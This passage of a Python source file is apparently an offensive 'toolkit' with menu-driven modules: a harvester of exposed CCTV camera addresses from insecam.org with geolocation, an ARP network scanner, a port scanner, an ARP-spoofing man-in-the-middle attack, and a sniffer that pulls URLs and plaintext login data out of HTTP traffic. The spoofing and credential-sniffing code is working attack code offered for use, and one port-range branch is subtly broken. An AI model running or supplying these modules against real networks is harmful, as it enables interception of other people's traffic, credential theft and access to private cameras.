		    countries = ["US", "JP", "IT", "KR", "FR", "DE", "TW", "RU", "GB", "NL",
		                 "CZ", "TR", "AT", "CH", "ES", "CA", "SE", "IL", "PL", "IR",
		                 "NO", "RO", "IN", "VN", "BE", "BR", "BG", "ID", "DK", "AR",
		                 "MX", "FI", "CN", "CL", "ZA", "SK", "HU", "IE", "EG", "TH",
		                 "UA", "RS", "HK", "GR", "PT", "LV", "SG", "IS", "MY", "CO",
		                 "TN", "EE", "DO", "SI", "EC", "LT", "PS", "NZ", "BD", "PA",
		                 "MD", "NI", "MT", "IT", "SA", "HR", "CY", "PK", "AE", "KZ",
		                 "KW", "VE", "GE", "ME", "SV", "LU", "CW", "PR", "CR", "BY",
		                 "AL", "LI", "BA", "PY", "PH", "FO", "GT", "NP", "PE", "UY",
		                 "-"]
		    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"}
		    num = int(input("[?] What country will it be : "))
		    print("[=] Gathering CCTV Cameras, please wait...")
		    if num not in range(1, 91+1):
		        raise IndexError

		    country = countries[num-1]
		    res = requests.get(
		        f"https://www.insecam.org/en/bycountry/{country}", headers=headers
		    )
		    last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]
		    for page in range(int(last_page)):
		        res = requests.get(
		            f"https://www.insecam.org/en/bycountry/{country}/?page={page}",
		            headers=headers
		        )
		        find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)
		        for ip in find_ip:
		            ip_list = []
		            ip_list.append(ip)
		            ip_list = ' '.join(ip_list).replace('http://','').split()
		            for single in ip_list:
		            	ip_port = single
		            	single, sep, tail = single.partition(':')
		            	web = "http://ip-api.com/json/"
		            	target = single
		            	web += target
		            	response = requests.get(web).json()
		            	camera = "http://" + ip_port
		            	loc = response['city']
		            	separator = "|"
		            	#print(Fore.CYAN + "http://" + ip_port + "   |   " + loc + Fore.WHITE)
		            	print(Fore.CYAN + '{0:30}{1:10}{2:10}'.format(camera,separator, loc) + Fore.WHITE)

		except ValueError:
		    print("\n[-] Quitting...\n\n")
		except KeyboardInterrupt:
			print("\n[-] Program interrumpted by user, quitting...\n\n")
		finally:
		    exit()
	## NETWORK SCANNER ##
	def net_scan():
		import scapy.all as scapy
		print(Fore.CYAN + "[=] Running Module nº7: Network Scanner..." + Fore.WHITE)
		print("[?] Please enter the range of your subnet: ")
		ip_range = input("[+] Format: 192.168.1.1/24\n")
		
		arp_result = scapy.arping(ip_range)
		print("-------------------------------------")
		print("  MAC address	    Vendor  IP\n\n")
		print("[-] Scan finished. If it failed to discover hosts, run it again\n\n")

	## 	PORT SCANNER ##
	def port_scan():
		print(Fore.CYAN + "[=] Running Module nº8: Open Port Scanner..." + Fore.WHITE)
		import socket, time
		from datetime import datetime
		target = input("[?] Specify the target ip address: ")
		print("-----------------------------------------")
		print("Scanning target: " + target)
		print("Time started: " + str(datetime.now()))
		print("-----------------------------------------\n")


		# SCANNER FUNCTION
		def scanner(port):
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.settimeout(0.5)
				sock.connect((target, port))
				sock.close()
				return True
			except:
				return False
		print("\n[=] Scanning common ports...")
		print("----------------------------")

		# Common Ports
		common_ports = {
		 
			'21': 'FTP',
			'22': 'SSH',
			'23': 'TELNET',
			'25': 'SMTP',
			'53': 'DNS',
			'69': 'TFTP',
			'80': 'HTTP',
			'109': 'POP2',
			'110': 'POP3',
			'123': 'NTP',
			'137': 'NETBIOS-NS',
			'138': 'NETBIOS-DGM',
			'139': 'NETBIOS-SSN',
			'143': 'IMAP',
			'156': 'SQL-SERVER',
			'389': 'LDAP',
			'443': 'HTTPS',
			'546': 'DHCP-CLIENT',
			'547': 'DHCP-SERVER',
			'995': 'POP3-SSL',
			'993': 'IMAP-SSL',
			'2086': 'WHM/CPANEL',
			'2087': 'WHM/CPANEL',
			'2082': 'CPANEL',
			'2083': 'CPANEL',
			'3306': 'MYSQL',
			'8443': 'PLESK',
			'10000': 'VIRTUALMIN/WEBMIN'
		}

		for p, service in common_ports.items():
			port = int(p)
			result = scanner(port)
			if result == True:
				print("[+] Port "+ p + " running " + service +" service, is open!")
			else:
				pass

		# RANGE SCAN
		try:
			print("\n[?] Do you wish to scan a specific port range:")
			print("------------------------------------------------")
			print("[1] Port Range")
			print("[2] Quit")
			question = int(input("------------------------------------------------\n"))

			# RANGE
			if question == 1:
				print("\nPORT Ranges")
				print("----------------")
				print("[1] 1-500 ")
				print("[2] 500-1000")
				print("[3] 1000-1500")
				print("[4] 1500-2000")
				print("[5] 2000-2500")
				print("[6] 2500-3000")
				print("[7] 3000-3500")
				print("[8] 3500-4000")
				print("[9] 4000-4500")
				print("[10] 4500-5000")
				print("[11] 5000-5500")
				print("[12] 5500-6000")
				print("[13] 6000-6500")
				print("[14] 6500-7000")
				print("[15] 7000-7500")
				print("[16] 7500-8000")
				print("[17] 8000-8500")
				print("[18] 8500-9000")
				print("[19] 9000-9500")
				print("[20] 9500-10000")
				print("----------------")
				range_choosen = int(input("[+] What's the desired range you wish to scan 1 - 20: "))
				print("\n")
				if range_choosen == 1:
					for i in range(1, 500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 2:
					for i in range(500, 1000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 3:
					for i in range(1000, 1500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 4:
					for i in range(1500, 2000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 5:
					for i in range(2000, 2500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 6:
					for i in range(2500, 3000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 7:
					for i in range(3000, 3500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 8:
					for i in range(3500, 4000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 9:
					for i in range(4000, 4500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 10:
					for i in range(4500, 5000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 11:
					for i in range(5000, 5500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 12:
					for i in range(5500, 6000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 13:
					for i in range(6000, 6500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 14:
					for i in range(6500, 7000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 15:
					for i in range(7000, 7500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 16:
					for i in range(8500, 8000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 17:
					for i in range(8000, 8500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 18:
					for i in range(8500, 9000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 19:
					for i in range(9000, 9500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 20:
					for i in range(9500, 10000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
			elif question == 2:
				print("[-] Goodbye")		
			else:
				print("[-] None chosen, Goodbye!\n\n")		
		except KeyboardInterrupt:
			print("\n[-] Program ended by user, quitting...\n\n")
		except ValueError:
			print("\n[-] None chosen, Goodbye!\n\n")

	## ARP SPOOF ##
	def arp_spoof():
		import scapy.all as scapy
		print(Fore.CYAN + "[=] Running Module nº9: Arp spoofing attack..." + Fore.WHITE)
		print("[+] Enable IP forwarding by running these commands: ")
		print("[+] Run - > sudo sysctl -w net.inet.ip.forwarding=1")
		print("[+] And - >  sudo sysctl -w net.inet.ip.fw.enable=1\n") 
		def get_mac(ip):
			arp_request = scapy.ARP(pdst=ip)
			broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
			arp_request_broadcast = broadcast/arp_request
			answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
			
			return answered_list[0][1].hwsrc

		def spoof(target_ip, spoof_ip):
			target_mac = get_mac(target_ip)
			# Create ARP packet and send it to target
			packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
			scapy.send(packet, verbose=False)

		def restore(dest_ip, src_ip):
			dest_mac = get_mac(dest_ip)
			src_mac = get_mac(src_ip)
			packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
			scapy.send(packet, verbose=False)

		router_ip = input("[?] Enter the target ip address: ")
		target_ip = input("[?] Enter the router ip address: ")

		sent_packets_count = 0 
		try:
			while True:
				spoof(target_ip, router_ip)
				spoof(router_ip, target_ip)
				sent_packets_count = sent_packets_count + 2
				print("\r[=] Packets sent: " + str(sent_packets_count), end="")
				time.sleep(2)
		except KeyboardInterrupt:
			restore(target_ip, router_ip)
			print("\n[-] Program ended by user, quitting and restorin ARP tables...\n\n")

	## P*SSWRD AND URL SNIFFER ##
	def psswd_url_sniff():	
		import scapy.all as scapy
		from scapy.layers import http
		print(Fore.CYAN + "[=] Running Module nº10: Password and Url sniffer..." + Fore.WHITE)

		try:
			
			def sniff(interface):
				scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")
			
			def get_url(packet):
				return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

			def get_login(packet):
				if packet.haslayer(scapy.Raw):
						load = str(packet[scapy.Raw].load)
						keywords = ["username", "password", "user", "passwd", "usr", "login", "pass"]
						for keyword in keywords:
							if keyword in load:
								return load

			def process_sniffed_packet(packet):
				if packet.haslayer(http.HTTPRequest):
					
					url = get_url(packet)
					print("[+] HTTPRequest >> " + url.decode())

					login_info = get_login(packet)
					if login_info:
						print("\n\n[+] Possible login info >> " + login_info + "\n\n\n")
					
			interface = input("[?] Interface you wish to use for sniffing attack: ")
			sniff(interface) 
			print("[=] Sniffer running...\n\n")
		except KeyboardInterrupt:
			print("\n[-] Program ended by user, quitting...\n\n")
	
	# UPDATE DEPENDECIES
	def update_mac():
		print(Fore.CYAN + "\n[=] Gathering information and updating dependecies..." + Fore.WHITE)
		subprocess.run(["curl", "https://bootstrap.pypa.io/get-pip.py -o get-pip.py"])
		subprocess.run(["python3", "get-pip.py"])
		subprocess.run(["pip3", "install", "--user", "--upgrade", "git+https://github.com/himanshudabas/twint.git@origin/twint-fixes#egg=twint"])
		subprocess.run(["pip3", "install", "scapy_http"])
		subprocess.run(["pip3", "install", "scapy"])
		subprocess.run(["pip3", "install", "libpcap"])

		print("\n\n[+] Update completed :)")
		print("\n\n")
	## OPTIONS
	def show_modules_mac():
		print(Fore.CYAN + "\n[01]--Password generator")
		print("[02]--Domain/IP address information gathering")
		print("[03]--Phone Information gathering")
		print("[04]--Username gatherer")
		print("[05]--Twitter information gathering")
		print("[06]--Security IP City Cameras")
		print("[07]--Network Scanner")
		print("[08]--Open Port Scanner")
		print("[09]--Arp spoofing MITM attack")
		print("[10]--Password and Url sniffer")
		print(Fore.MAGENTA + "\n\n[0]--Quit")
		print(Fore.CYAN + "---------------------------------"+ Fore.WHITE)
		try:
			option = int(input("[?] Where do you want to start: \n\n"))
			if option == 1:
				psswd_gen()
			elif option == 2:
				lookup()
			elif option == 3:
				phone()
			elif option == 4:
				usernames()
			elif option == 5:
				tweets()
			elif option == 6:
				cameras()
			elif option == 7:
				net_scan()
			elif option == 8:
				port_scan()
			elif option == 9:
				arp_spoof()
			elif option == 10:
				psswd_url_sniff()
			elif option == 0:
				print(Fore.CYAN + "[-] Quitting..." + Fore.WHITE)
			elif option == 99:
				show_modules_mac()
			elif option == 98:
				update_mac() 
		except KeyboardInterrupt:
			print(Fore.CYAN + "\n[-] Program interrumpted, quitting...\n\n"+ Fore.WHITE)
		except ValueError:
			print(Fore.CYAN + "\n[-] Wrong value given, quitting...\n\n" + Fore.WHITE)

	try:
		choice = int(input(Fore.CYAN + "[?] Welcome, what module you wish to load:\n[+] 10 Modules loaded\n[98] Update/Install dependecies\n[99] Show modules\n"+ Fore.MAGENTA +"[0] Quit program\n\n" + Fore.WHITE))

		if choice == 99:
			show_modules_mac()
		elif choice == 98:
			update_mac()
		elif choice == 1:
			psswd_gen()
		elif choice == 2:
			lookup()
		elif choice == 3:
			phone()
		elif choice == 4:
			usernames()
		elif choice == 5:
			tweets()
		elif choice == 6:
			cameras()
		elif choice == 7:
			net_scan()
		elif choice == 8:
			port_scan()
		elif choice == 9:
			arp_spoof()
		elif choice == 10:
			psswd_url_sniff()
		elif choice == 0:
			print(Fore.CYAN + "[-] Quitting..." + Fore.WHITE)
		else:
			print(Fore.CYAN + "[-] None chosen, quitting...\n\n" + Fore.WHITE)
	except KeyboardInterrupt:
		print(Fore.CYAN + "\n[-] Program interrumpted, quitting...\n\n" + Fore.WHITE)
	except ValueError:
		print(Fore.CYAN + "\n[-] Wrong value given, quitting...\n\n" + Fore.WHITE)

# CHECK SUDO and OS
def is_root():
    return os.geteuid() == 0
sudo = is_root()
if sudo == True:
	if platform == "linux" or platform == "linux2":
		main()
	elif platform == "darwin":
		main_macos()
else:
	print(Fore.CYAN + "[+] Please, run this toolkit as sudo\n\n" + Fore.WHITE)
